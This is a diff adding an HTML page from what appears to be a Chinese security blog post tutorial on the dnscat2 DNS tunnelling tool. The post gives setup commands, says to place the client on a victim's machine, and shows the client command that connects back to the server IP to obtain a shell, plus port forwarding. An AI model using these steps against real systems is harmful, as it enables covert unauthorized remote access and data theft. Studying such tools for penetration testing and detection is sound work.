@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>DNScat2使用 | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">DNScat2使用</h2>
+            <div class="post-date">2020-01-02</div>
+            
+            <div class="post-content">
+              <p><strong>介绍</strong></p>
+<!-- more -->
+<p>DNScat堪称神器，因为它可以通过DNS协议创建C&amp;C隧道，让攻击者更加隐蔽。你可以访问任何数据以及上传和下载文件，并且获得一个shell。这个工具也是基于53端口的，所以你不需要对DNS服务器进行权威访问，只要通过53端口就能建立连接，速度会快很多，而且发送的流量都是正常流量。但是这些通信流量在数据包日志里就非常明显了，容易被发现。</p>
+<p><strong>安装</strong><br>
+git clone //github.com/iagox86/dnscat2.git<br>
+下载完，主要有server(服务端),client(客户端)<br>
+<img src="https://guokeya.github.io/post-images/1577951027324.png" alt="" loading="lazy"><br>
+cd server<br>
+gem install bundler<br>
+bundle install<br>
+#在进行这步的时候，不能用root用户，普通用户直接执行，也不用sudo<br>
+切换到root<br>
+服务端：<br>
+ruby dnscat2.rb<br>
+<img src="https://guokeya.github.io/post-images/1577951032854.png" alt="" loading="lazy"><br>
+客户端：<br>
+将上面dnscat2文件夹中的client端传到受害者机子上<br>
+cd client<br>
+make<br>
+./dnscat --dns server=&lt;服务端IP&gt;,port=53 -secret=&lt;服务端启动时的密钥&gt;</p>
+<p><img src="https://guokeya.github.io/post-images/1577951037952.png" alt="" loading="lazy"><br>
+基础命令<br>
+session<br>
+查看shell<br>
+session -i 1<br>
+进入shell<br>
+<img src="https://guokeya.github.io/post-images/1577951043346.png" alt="" loading="lazy"><br>
+shell，创建一个shell<br>
+session -i 2</p>
+<p><img src="https://guokeya.github.io/post-images/1577951047792.png" alt="" loading="lazy"><br>
+端口转发<br>
+listen 127.0.0.1:9999 10.100.100.1:22<br>
+将本地端口9999转发到10.100.100.1的22端口</p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/EfzSPkBWE/" class="tag">
+                    渗透测试
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/6eQuN_-1h/">
+                  <h3 class="post-title">
+                    PowerShell Empire工具使用
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
